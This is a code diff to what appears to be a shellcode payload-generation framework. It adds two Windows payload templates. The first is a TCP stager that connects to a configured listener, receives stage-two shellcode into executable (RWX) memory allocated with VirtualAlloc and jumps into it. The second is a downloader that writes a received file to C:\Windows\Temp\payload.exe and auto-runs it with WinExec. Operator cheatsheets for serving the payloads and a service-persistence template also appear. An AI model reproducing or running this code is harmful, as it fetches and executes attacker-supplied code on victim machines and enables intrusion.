@@ -28,8 +28,10 @@ from .ir import (
     AddressOf,
     AllocateLocal,
     AllocateStruct,
+    ArithOp,
     Block,
     CallAPI,
+    CallSlot,
     Compare,
     ConstructString,
     DefineConstant,
@@ -42,6 +44,7 @@ from .ir import (
     TerminateStyle,
     ValueRef,
     Workflow,
+    WriteSlot,
     WriteStructField,
     ZeroStruct,
 )
@@ -178,6 +181,18 @@ class WorkflowTemplate(PayloadTemplate):
 
                 elif isinstance(op, AllocateStruct):
                     _add(op.struct_type)
+
+                elif isinstance(op, WriteSlot):
+                    _add(op.name)
+                    self._collect_value_refs(op.value, _add)
+
+                elif isinstance(op, ArithOp):
+                    _add(op.result)
+                    self._collect_value_refs(op.left, _add)
+                    self._collect_value_refs(op.right, _add)
+
+                elif isinstance(op, CallSlot):
+                    _add(op.target)
 
                 elif isinstance(op, Compare):
                     _add(op.value)
@@ -1153,4 +1168,433 @@ class IRServicePersistTemplate(WorkflowTemplate):
             ("Binary path on target", dst),
             ("Check status", f"sc query {svc}"),
             ("Remove service", f"sc delete {svc}"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# TCP stager workflow
+# ---------------------------------------------------------------------------
+
+_MEM_COMMIT_RESERVE = 0x3000
+_PAGE_EXECUTE_READWRITE = 0x40
+
+
+def build_tcp_stager_workflow(
+    lhost: str = "127.0.0.1",
+    lport: int = 4444,
+) -> Workflow:
+    """Build the tcp_stager reference workflow.
+
+    WSAStartup -> WSASocketA -> connect -> recv(4 byte size header) ->
+    VirtualAlloc(RWX) -> recv loop (accumulate into allocated buffer) ->
+    closesocket -> call [virt_buf] (transfer to stage 2)
+
+    Protocol: [4 bytes LE] stage2_size, then [stage2_size bytes] raw shellcode.
+
+    No exit strategy: control transfers to stage 2 (CallSlot). The only
+    failure path is a hang (Terminate), since there is nothing to clean up
+    if network setup fails before stage 2 runs.
+    """
+    port_be = _socket.htons(lport)
+    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]
+
+    return Workflow(
+        name="ir_tcp_stager",
+        blocks=(
+            Block("entry", (
+                DefineConstant("sin_port_be", port_be),
+                DefineConstant("sin_addr_le", ip_le),
+                DefineConstant("af_inet", 2),
+
+                AllocateStruct("wsadata", "WSADATA"),
+                AllocateStruct("sa", "sockaddr_in"),
+
+                AllocateLocal("bytes_total"),
+                AllocateLocal("bytes_recvd"),
+                AllocateLocal("remaining"),
+                AllocateLocal("recv_buf_ptr"),
+
+                CallAPI(
+                    "WSAStartup",
+                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
+                    result="wsa_ret",
+                ),
+                Compare("wsa_ret", SuccessPredicate.ZERO,
+                        true_block="create_socket", false_block="fail"),
+            )),
+
+            Block("create_socket", (
+                CallAPI(
+                    "WSASocketA",
+                    arguments=(
+                        Immediate(2),    # AF_INET
+                        Immediate(1),    # SOCK_STREAM
+                        Immediate(6),    # IPPROTO_TCP
+                        Immediate(0),    # lpProtocolInfo = NULL
+                        Immediate(0),    # g = 0
+                        Immediate(0),    # dwFlags = 0
+                    ),
+                    result="socket_handle",
+                ),
+                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
+                        true_block="connect_socket", false_block="fail"),
+            )),
+
+            Block("connect_socket", (
+                ZeroStruct("sa"),
+                WriteStructField("sa", "sin_family", NameRef("af_inet")),
+                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
+                WriteStructField("sa", "sin_addr", NameRef("sin_addr_le")),
+
+                CallAPI(
+                    "connect",
+                    arguments=(
+                        NameRef("socket_handle"),
+                        AddressOf("sa"),
+                        Immediate(0x10),
+                    ),
+                    result="conn_ret",
+                ),
+                Compare("conn_ret", SuccessPredicate.ZERO,
+                        true_block="recv_size", false_block="fail"),
+            )),
+
+            Block("recv_size", (
+                CallAPI(
+                    "recv",
+                    arguments=(
+                        NameRef("socket_handle"),
+                        AddressOf("bytes_total"),
+                        Immediate(4),
+                        Immediate(0),
+                    ),
+                    result="recv_size_ret",
+                ),
+                Compare("recv_size_ret", SuccessPredicate.SIGNED_POSITIVE,
+                        true_block="alloc_buffer", false_block="fail"),
+            )),
+
+            Block("alloc_buffer", (
+                CallAPI(
+                    "VirtualAlloc",
+                    arguments=(
+                        Immediate(0),               # lpAddress = NULL
+                        NameRef("bytes_total"),
+                        Immediate(_MEM_COMMIT_RESERVE),
+                        Immediate(_PAGE_EXECUTE_READWRITE),
+                    ),
+                    result="virt_buf",
+                ),
+                Compare("virt_buf", SuccessPredicate.NONZERO,
+                        true_block="init_recv", false_block="fail"),
+            )),
+
+            Block("init_recv", (
+                WriteSlot("bytes_recvd", Immediate(0)),
+                Jump("recv_loop"),
+            )),
+
+            Block("recv_loop", (
+                ArithOp("recv_buf_ptr", NameRef("virt_buf"),
+                        NameRef("bytes_recvd"), "add"),
+                ArithOp("remaining", NameRef("bytes_total"),
+                        NameRef("bytes_recvd"), "sub"),
+
+                CallAPI(
+                    "recv",
+                    arguments=(
+                        NameRef("socket_handle"),
+                        NameRef("recv_buf_ptr"),
+                        NameRef("remaining"),
+                        Immediate(0),
+                    ),
+                    result="recv_ret",
+                ),
+                Compare("recv_ret", SuccessPredicate.SIGNED_POSITIVE,
+                        true_block="accumulate", false_block="recv_done"),
+            )),
+
+            Block("accumulate", (
+                ArithOp("bytes_recvd", NameRef("bytes_recvd"),
+                        NameRef("recv_ret"), "add"),
+                ArithOp("remaining", NameRef("bytes_total"),
+                        NameRef("bytes_recvd"), "sub"),
+                Compare("remaining", SuccessPredicate.NONZERO,
+                        true_block="recv_loop", false_block="recv_done"),
+            )),
+
+            Block("recv_done", (
+                CallAPI(
+                    "closesocket",
+                    arguments=(NameRef("socket_handle"),),
+                ),
+                CallSlot("virt_buf"),
+            )),
+
+            Block("fail", (
+                Terminate(TerminateStyle.HANG),
+            )),
+        ),
+        entry="entry",
+    )
+
+
+class IRTcpStagerTemplate(WorkflowTemplate):
+    """IR-backed tcp_stager template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_tcp_stager_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        return build_tcp_stager_workflow(
+            lhost=config.lhost,
+            lport=config.lport,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Serve stage-2 shellcode",
+             f"python3 Tools/tcp_stage_server.py --port {config.lport} "
+             f"--file emitter_out/bin/shellcode.bin"),
+            ("Protocol", "[4 bytes LE size][raw stage-2 shellcode bytes]"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# TCP download workflow
+# ---------------------------------------------------------------------------
+
+_GENERIC_WRITE = 0x40000000
+_CREATE_ALWAYS = 2
+_FILE_ATTRIBUTE_NORMAL = 0x80
+
+
+def build_tcp_download_workflow(
+    lhost: str = "127.0.0.1",
+    lport: int = 4444,
+    dst_path: str = r"C:\Windows\Temp\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the tcp_download reference workflow.
+
+    WSAStartup -> WSASocketA -> connect -> recv(4 byte size header) ->
+    VirtualAlloc -> recv loop -> closesocket ->
+    CreateFileA -> WriteFile -> CloseHandle -> WinExec(dst) -> exit
+
+    Same recv loop protocol as tcp_stager, but writes to disk and executes
+    instead of jumping to the buffer.
+    """
+    port_be = _socket.htons(lport)
+    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]
+
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_tcp_download",
+        blocks=(
+            Block("entry", (
+                DefineConstant("sin_port_be", port_be),
+                DefineConstant("sin_addr_le", ip_le),
+                DefineConstant("af_inet", 2),
+
+                AllocateStruct("wsadata", "WSADATA"),
+                AllocateStruct("sa", "sockaddr_in"),
+
+                AllocateLocal("bytes_total"),
+                AllocateLocal("bytes_recvd"),
+                AllocateLocal("remaining"),
+                AllocateLocal("recv_buf_ptr"),
+                AllocateLocal("bytes_written"),
+
+                ConstructString("dst_path", dst_path),
+
+                CallAPI(
+                    "WSAStartup",
+                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
+                    result="wsa_ret",
+                ),
+                Compare("wsa_ret", SuccessPredicate.ZERO,
+                        true_block="create_socket", false_block="fail"),
+            )),
+
+            Block("create_socket", (
+                CallAPI(
+                    "WSASocketA",
+                    arguments=(
+                        Immediate(2), Immediate(1), Immediate(6),
+                        Immediate(0), Immediate(0), Immediate(0),
+                    ),
+                    result="socket_handle",
+                ),
+                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
+                        true_block="connect_socket", false_block="fail"),
+            )),
+
+            Block("connect_socket", (
+                ZeroStruct("sa"),
+                WriteStructField("sa", "sin_family", NameRef("af_inet")),
+                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
+                WriteStructField("sa", "sin_addr", NameRef("sin_addr_le")),
+
+                CallAPI(
+                    "connect",
+                    arguments=(
+                        NameRef("socket_handle"),
+                        AddressOf("sa"),
+                        Immediate(0x10),
+                    ),
+                    result="conn_ret",
+                ),
+                Compare("conn_ret", SuccessPredicate.ZERO,
+                        true_block="recv_size", false_block="fail"),
+            )),
+
+            Block("recv_size", (
+                CallAPI(
+                    "recv",
+                    arguments=(
+                        NameRef("socket_handle"),
+                        AddressOf("bytes_total"),
+                        Immediate(4),
+                        Immediate(0),
+                    ),
+                    result="recv_size_ret",
+                ),
+                Compare("recv_size_ret", SuccessPredicate.SIGNED_POSITIVE,
+                        true_block="alloc_buffer", false_block="fail"),
+            )),
+
+            Block("alloc_buffer", (
+                CallAPI(
+                    "VirtualAlloc",
+                    arguments=(
+                        Immediate(0),
+                        NameRef("bytes_total"),
+                        Immediate(_MEM_COMMIT_RESERVE),
+                        Immediate(_PAGE_EXECUTE_READWRITE),
+                    ),
+                    result="virt_buf",
+                ),
+                Compare("virt_buf", SuccessPredicate.NONZERO,
+                        true_block="init_recv", false_block="fail"),
+            )),
+
+            Block("init_recv", (
+                WriteSlot("bytes_recvd", Immediate(0)),
+                Jump("recv_loop"),
+            )),
+
+            Block("recv_loop", (
+                ArithOp("recv_buf_ptr", NameRef("virt_buf"),
+                        NameRef("bytes_recvd"), "add"),
+                ArithOp("remaining", NameRef("bytes_total"),
+                        NameRef("bytes_recvd"), "sub"),
+                CallAPI(
+                    "recv",
+                    arguments=(
+                        NameRef("socket_handle"),
+                        NameRef("recv_buf_ptr"),
+                        NameRef("remaining"),
+                        Immediate(0),
+                    ),
+                    result="recv_ret",
+                ),
+                Compare("recv_ret", SuccessPredicate.SIGNED_POSITIVE,
+                        true_block="accumulate", false_block="recv_done"),
+            )),
+
+            Block("accumulate", (
+                ArithOp("bytes_recvd", NameRef("bytes_recvd"),
+                        NameRef("recv_ret"), "add"),
+                ArithOp("remaining", NameRef("bytes_total"),
+                        NameRef("bytes_recvd"), "sub"),
+                Compare("remaining", SuccessPredicate.NONZERO,
+                        true_block="recv_loop", false_block="recv_done"),
+            )),
+
+            Block("recv_done", (
+                CallAPI(
+                    "closesocket",
+                    arguments=(NameRef("socket_handle"),),
+                ),
+                Jump("write_file"),
+            )),
+
+            Block("write_file", (
+                CallAPI(
+                    "CreateFileA",
+                    arguments=(
+                        AddressOf("dst_path"),
+                        Immediate(_GENERIC_WRITE),
+                        Immediate(0),               # dwShareMode = 0
+                        Immediate(0),               # lpSecurityAttributes = NULL
+                        Immediate(_CREATE_ALWAYS),
+                        Immediate(_FILE_ATTRIBUTE_NORMAL),
+                        Immediate(0),               # hTemplateFile = NULL
+                    ),
+                    result="file_handle",
+                ),
+                Compare("file_handle", SuccessPredicate.INVALID_HANDLE,
+                        true_block="do_write", false_block="fail"),
+            )),
+
+            Block("do_write", (
+                CallAPI(
+                    "WriteFile",
+                    arguments=(
+                        NameRef("file_handle"),
+                        NameRef("virt_buf"),
+                        NameRef("bytes_total"),
+                        AddressOf("bytes_written"),
+                        Immediate(0),               # lpOverlapped = NULL
+                    ),
+                    result="write_ret",
+                ),
+                CallAPI(
+                    "CloseHandle",
+                    arguments=(NameRef("file_handle"),),
+                ),
+                Jump("exec_payload"),
+            )),
+
+            Block("exec_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dst_path"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare("exec_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRTcpDownloadTemplate(WorkflowTemplate):
+    """IR-backed tcp_download template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_tcp_download_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_tcp_download_workflow(
+            lhost=config.lhost,
+            lport=config.lport,
+            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        dst = config.dst_path or r"C:\Windows\Temp\payload.exe"
+        return [
+            ("Serve payload",
+             f"python3 Tools/tcp_stage_server.py --port {config.lport} "
+             f"--file <payload.exe>"),
+            ("Protocol", "[4 bytes LE size][raw file bytes]"),
+            ("Written to", dst),
+            ("Auto-executed via WinExec after download", ""),
         ]
